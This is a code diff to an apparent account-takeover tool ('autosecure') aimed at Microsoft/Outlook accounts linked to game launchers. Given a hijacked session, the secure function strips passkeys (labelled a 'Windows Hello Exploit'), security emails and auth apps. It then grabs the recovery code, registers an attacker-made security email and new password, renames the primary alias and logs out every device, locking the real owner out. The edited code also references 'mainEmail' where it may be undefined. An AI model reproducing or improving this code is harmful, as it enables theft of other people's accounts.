@@ -29,16 +29,16 @@ import json
 ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]
 database = DBConnection()
 
-async def secure(session: httpx.AsyncClient):
+async def secure(session: httpx.AsyncClient, recovery: bool):
 
     apicanary = await getCookies(session) 
 
     accountInfo = {
         "name": "Could not find",
         "email": "Couldn't Change!",
-        "secEmail": "Couldn't Change!",
+        "security_email": "Couldn't Change!",
         "password": "Couldn't Change!",
-        "recoveryCode": "Couldn't Change!",
+        "recovery_code": "Couldn't Change!",
         "status": "Unknown",
         "SSID": False,
         "firstName": "Failed to Get",
@@ -131,63 +131,63 @@ async def secure(session: httpx.AsyncClient):
     # Pass Keys / Windows Hello Exploit
     await removeZyger(session, apicanary)
 
-    # Removes secEmails / Auth Apps
+    # Removes security_emails / Auth Apps
     await removeProof(session, apicanary)
     print("[+] - Removed all Proofs")
     
-    # Third Partie Launchers (Minecraft, Prism)
+    # Third Party Launchers (Minecraft, Prism)
     await removeServices(session)   
 
-    securityParameters = json.loads(await securityInformation(session))
-    print("[+] - Got Security Parameters")
-    
-    if securityParameters:
-        
-        # Original Email
-        mainEmail = securityParameters["email"]
-        encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
-        
-        recoveryCode = await getRecoveryCode(
-            session,
-            apicanary,
-            encryptedNetID
-        )
-        print(f"[+] - Got Recovery Code | {recoveryCode}")
+    if recovery:
 
-        secEmail = uuid.uuid4().hex[:16]
-        newPassword = uuid.uuid4().hex[:12]
+        securityParameters = json.loads(await securityInformation(session))
+        print("[+] - Got Security Parameters")
 
-        emailToken, secEmail = await generateEmail(secEmail, newPassword)
+        if securityParameters:
 
-        print(f"[+] - Generated Security Email ({secEmail})")
-        database.addEmail(secEmail, newPassword)
-        
-        print("[~] - Automaticly Securing Account...")
-        newData = await recover(mainEmail, recoveryCode, secEmail, newPassword, emailToken) 
+            # Original Email
+            mainEmail = securityParameters["email"]
+            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
 
-        if newData:
-            accountInfo["secEmail"] = secEmail
-            accountInfo["recoveryCode"] = newData
-            accountInfo["password"] = newPassword
-        else:
-            print(f"[X] - Failed to secure this account")
-        
-        # Change Primary Alias is broken
-        if ralias:
+            recovery_code = await getRecoveryCode(
+                session,
+                apicanary,
+                encryptedNetID
+            )
+            print(f"[+] - Got Recovery Code | {recovery_code}")
 
-            primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
-            print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
+            security_email = uuid.uuid4().hex[:16]
+            password = uuid.uuid4().hex[:12]
 
-            info = await changePrimaryAlias(session, primaryEmail, apicanary)
+            email_token, security_email = await generateEmail(security_email, password)
 
-            if info:
-                accountInfo["email"] = f"{primaryEmail}@outlook.com"
-                print(f"[+] - Changed Primary Alias")
+            print(f"[+] - Generated Security Email ({security_email})")
+            database.addEmail(security_email, password)
+
+            print("[~] - Automaticly Securing Account...")
+            data = await recover(session, mainEmail, recovery_code, security_email, password, email_token) 
+
+            if data and data != "invalid":
+                accountInfo["security_email"] = security_email
+                accountInfo["recovery_code"] = data["recovery_code"]
+                accountInfo["password"] = password
             else:
-                accountInfo["email"] = mainEmail
+                print(f"[X] - Failed to secure this account")
+        
+    # Change Primary Alias is broken
+    if ralias:
 
+        primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
+        print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
+        info = await changePrimaryAlias(session, primaryEmail, apicanary)
+        if info:
+            accountInfo["email"] = f"{primaryEmail}@outlook.com"
+            print(f"[+] - Changed Primary Alias")
         else:
             accountInfo["email"] = mainEmail
+
+    else:
+        accountInfo["email"] = mainEmail
         
     # Logout all devices
     await logoutAll(session, apicanary)
